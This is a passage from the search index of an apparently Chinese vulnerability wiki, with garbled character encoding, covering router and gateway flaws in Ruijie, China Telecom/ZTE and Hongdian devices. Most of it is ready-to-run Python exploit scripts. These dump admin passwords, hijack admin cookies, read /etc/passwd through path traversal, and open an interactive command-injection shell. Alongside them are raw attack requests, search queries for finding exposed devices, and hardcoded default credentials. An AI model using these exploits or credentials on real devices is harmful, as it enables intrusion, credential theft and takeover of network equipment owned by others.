response.text)[0] print(\"\\033[36m[o] ÊàêÂäüËé∑Âèñ, Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÁôªÂΩï..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] ÊàêÂäüËé∑ÂèñÁÆ°ÁêÜÂëòCookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/download.php?a=read_txt&file=../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } try: response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ËØªÂèñ /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÊàêÂäüËØªÂèñ /etc/passwd \\n[o] ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑NBR 1300GË∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑NBR 1300GË∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÈîêÊç∑NBR 1300GË∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑NBR 1300GË∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑NBR 1300GË∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåguestË¥¶Êà∑ÂèØ‰ª•Ë∂äÊùÉËé∑ÂèñÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑NBRË∑ØÁî±Âô® FOFA [!NOTE] title=\"ÈîêÊç∑ÁΩëÁªú --NBRË∑ØÁî±Âô®--ÁôªÂΩïÁïåÈù¢\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Êü•ÁúãÊµÅÈáèÂèëÁé∞ CLIÂëΩ‰ª§ÊµÅÈáè ËØ∑Ê±ÇÂåÖ‰∏∫ POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant. ÊµãËØïÂèëÁé∞ÊâßË°åÂÖ∂‰ªñÂëΩ‰ª§ÈúÄË¶ÅÊùÉÈôêÔºåÊü•ÁúãÊâãÂÜåÂèëÁé∞Â≠òÂú®‰ΩéÊùÉÈôê guestË¥¶Êà∑Ôºàguest/guestÔºâ ÁôªÂΩïÂêéÂèëÈÄÅËØ∑Ê±ÇÂåÖÔºåÊâßË°åCLIÂëΩ‰ª§ (show webmaster user) Êü•ÁúãÁî®Êà∑ÈÖçÁΩÆË¥¶Âè∑ÂØÜÁ†Å ÊàêÂäüËé∑ÂèñÊâÄÊúâÁî®Êà∑ÁöÑË¥¶Âè∑ÂØÜÁ†Å webmaster level 0 username admin password guest webmaster level 0 username guest password guest ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑NBRNBR1300G Ë∑ØÁî±Âô® Ë∂äÊùÉCLIÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/WEB_VMS/LEVEL15/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å show webmaster user \\033[0m\".format(target_url)) if \"webmaster\" in response.text and \" password\" in response.text and response.status_code == 200: user_data = re.findall(r'webmaster level 0 username admin password (.*?)', response.text)[0] print(\"\\033[36m[o] ÊàêÂäüËé∑Âèñ, ÁÆ°ÁêÜÂëòÁî®Êà∑Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫: admin/{} \\033[0m\".format(user_data)) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑ISG Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑ISG Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ÈîêÊç∑ISG Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑ISG Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑ISG Â≠òÂú®Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÈÄöËøáÊü•ÁúãÂâçÁ´ØÔºåÂèØ‰ª•Ëé∑ÂèñÂØÜÁ†ÅÁöÑmd5ÂÄº, Ëß£ÂØÜÂêéËé∑ÂèñÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑ISG FOFA [!NOTE] title=\"RG-ISG\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã F12 Êü•ÁúãÂà∞Ë¥¶Âè∑ÂØÜÁ†Å Ëß£ÂØÜmd5 ÂêéÁôªÈôÜÁ≥ªÁªü Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/","title":"Áîµ‰ø°","keywords":"","body":"Áîµ‰ø° Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊºèÊ¥û Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gch ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞ÁôªÈôÜÈ°µÈù¢Áî®Êà∑ÂêçÂèÇÊï∞Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áîµ‰ø°ÁΩëÂÖ≥ÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] body=\"src=\\\"img/dl.gif\\\"\" && title=\"Á≥ªÁªüÁôªÂΩï\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆæÂ§áÂ≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ admin/admin ÁôªÂΩïÁöÑËØ∑Ê±ÇÂåÖ‰∏∫ POST /manager/login.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6 Connection: close Name=admin&Pass=admin ‰øùÂ≠ò‰∏∫Êñá‰ª∂‰ΩøÁî® SqlmapÂ∑•ÂÖ∑ÔºåÊ≥®ÂÖ•ÁÇπ‰∏∫ NameÂèÇÊï∞ sqlmap -r sql-1.txt -p Name --risk 3 Goby & POC [!NOTE] Hsmedia Hgateway default account Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊºèÊ¥û.html","title":"Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊºèÊ¥û","keywords":"","body":"Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ Â≠òÂú®ÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áîµ‰ø°‰∏≠ÂÖ¥ZXHN F450AÁΩëÂÖ≥ FOFA [!NOTE] ZXHN F450A ÊºèÊ¥ûÊèèËø∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã user/pass useradmin/nE7jA%5m ÊôÆÈÄöÁÆ°ÁêÜÂëò telecomadmin/nE7jA%5m Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëò Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gch ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Áîµ‰ø°/Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gch ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gch ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gch ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 web_shell_cmd.gchÊñá‰ª∂Â≠òÂú®ÂëΩ‰ª§Ë∞ÉËØïÁïåÈù¢ÔºåÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áîµ‰ø°Â§©ÁøºÁΩëÂÖ≥F460 FOFA [!NOTE] title=\"F460\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ web_shell_cmd.gch Áõ¥Êé•ËæìÂÖ•ÂëΩ‰ª§Â∞±ÂèØ‰ª•ÊâßË°å cat /etc/passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/","title":"ÂÆèÁîµ","keywords":"","body":"ÂÆèÁîµ ÂÆèÁîµ H8922 TelnetÂêéÈó®ÊºèÊ¥û CVE-2021-28149 ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150 ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151 ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 TelnetÂêéÈó®ÊºèÊ¥û CVE-2021-28149.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 TelnetÂêéÈó®ÊºèÊ¥û CVE-2021-28149.html","title":"ÂÆèÁîµ H8922 TelnetÂêéÈó®ÊºèÊ¥û CVE-2021-28149","keywords":"","body":"ÂÆèÁîµ H8922 TelnetÂêéÈó®ÊºèÊ¥û CVE-2021-28149 ÊºèÊ¥ûÊèèËø∞ ÂÆèÁîµ H8922 TelnetÂ≠òÂú®Á°¨ÁºñÁ†ÅÁöÑË¥¶Âè∑ÂØÜÁ†Å ‰∏îÈªòËÆ§ÂºÄÊîæ 5188Á´ØÂè£ËøûÊé•ÔºåÂèØ‰ª•‰ª•RootË∫´‰ªΩËé∑ÂèñÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆèÁîµ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®TelnetËøûÊé•ÁõÆÊ†á5188Á´ØÂè£ÔºåË¥¶Âè∑ÂØÜÁ†Å‰∏∫ root/superzxmn Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150.html","title":"ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150","keywords":"","body":"ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150 ÊºèÊ¥ûÊèèËø∞ ÂÆèÁîµ H8922 ÂêéÂè∞‰∏≠ÁöÑÁΩëÁªúÊµãËØïÊ®°Âùó‰∏≠Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û„ÄÇÈÄöËøáÂëΩ‰ª§ÊãºÊé•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆèÁîµ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞(Â≠òÂú®ËÆøÂÆ¢Áî®Êà∑ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å guest/guest) ‰ΩøÁî® ; ÂëΩ‰ª§ÊãºÊé•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ËØ∑Ê±ÇÂåÖ‰∏∫ POST /tools.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 96 Cache-Control: max-age=0 Authorization: Basic Z3Vlc3Q6Z3Vlc3Q= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A ÊºèÊ¥ûPOC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ÂÆèÁîµ H8922 ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-28150 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/tools.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,Â≠òÂú®ËÆøÂÆ¢Ë¥¶Âè∑ guest/guest ÊàêÂäüÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(cmd_test)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;{}&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(cmd_test)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151.html","title":"ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151","keywords":"","body":"ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151 ÊºèÊ¥ûÊèèËø∞ ÂÆèÁîµ H8922 ÂêéÂè∞Â≠òÂú®ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖ‰ΩøÁî®‰ªªÊÑèË¥¶Âè∑ÁôªÂΩïÂêéËÆøÈóÆÁâπÊÆäÁöÑUrlÂç≥ÂèØËé∑ÂèñÊâÄÊúâÁî®Êà∑ÁöÑË¥¶Âè∑ÂíåÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆèÁîµ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞(Â≠òÂú®ËÆøÂÆ¢Áî®Êà∑ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å guest/guest) ÊºèÊ¥ûÂ≠òÂú®‰∫é backup2.cgi Êñá‰ª∂‰∏≠ ÂàÜÊûêÂêéÂèØÂæóÁü•ÂÆûÈôÖËøêË°åÂêéÂ∞Ü‰ºöËØªÂèñ /tmp/hdconfig/cli.conf ÈÖçÁΩÆÊñá‰ª∂ ÂÖ∂‰∏≠ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÊòØÂê´ÊúâÊâÄÊúâÁî®Êà∑ÂØÜÁ†Å‰ª•ÂèäÊïèÊÑüÈÖçÁΩÆ‰ø°ÊÅØÁöÑ ÊºèÊ¥ûPOC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ÂÆèÁîµ H8922 ÂêéÂè∞ÁÆ°ÁêÜÂëò‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-28151 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') 